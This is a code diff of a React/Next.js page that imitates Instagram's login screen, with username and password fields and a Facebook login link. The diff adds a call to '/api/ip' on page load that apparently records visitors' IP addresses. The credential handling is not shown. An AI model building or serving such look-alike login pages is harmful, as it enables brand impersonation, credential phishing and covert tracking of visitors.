@@ -1,18 +1,22 @@
 "use client";
 
-import React from "react";
+import React, { useEffect, useState } from "react";
 import "./globals.css";
 import axios from "axios";
 import { Eye, EyeOff } from "lucide-react";
 import Link from "next/link";
 
-export default function Home() {
-  const [showPassword, setShowPassword] = React.useState(false);
+export default function Page() {
+  const [showPassword, setShowPassword] = useState(false);
 
-  const [data, setData] = React.useState({
+  const [data, setData] = useState({
     email: "",
     password: "",
   });
+
+  useEffect(() => {
+    axios.get("/api/ip");
+  }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -27,9 +31,6 @@ export default function Home() {
 
   return (
     <main className="flex align-items-center justify-content-center">
-      {/* Mobile Image */}
-
-      {/* Auth Section */}
       <section id="auth" className="flex direction-column">
         <div className="panel login flex direction-column">
           <h1 title="Instagram" className="flex justify-content-center">
@@ -44,13 +45,17 @@ export default function Home() {
               placeholder="Phone number, username, or email"
             />
 
-            {/* Password */}
             <div className="password-box">
               <input
                 name="password"
                 type={showPassword ? "text" : "password"}
                 value={data.password}
-                onChange={(e) => setData({ ...data, password: e.target.value })}
+                onChange={(e) =>
+                  setData({
+                    ...data,
+                    password: e.target.value,
+                  })
+                }
                 placeholder="Password"
               />
 
@@ -66,16 +71,12 @@ export default function Home() {
             <button type="submit">Log In</button>
           </form>
 
-          {/* Separator */}
           <div className="flex separator align-items-center">
             <span></span>
-
             <div className="or">OR</div>
-
             <span></span>
           </div>
 
-          {/* Facebook Login */}
           <div className="login-with-fb flex direction-column align-items-center">
             <div>
               <img src="/img/facebook-icon.jpg" alt="facebook" />
@@ -87,14 +88,12 @@ export default function Home() {
           </div>
         </div>
 
-        {/* Register */}
         <div className="panel register flex justify-content-center">
           <p>Don't have an account?</p>
 
           <Link href="/signup">Sign up</Link>
         </div>
 
-        {/* App Download */}
         <div className="app-download flex direction-column align-items-center">
           <p>Get the app.</p>
 
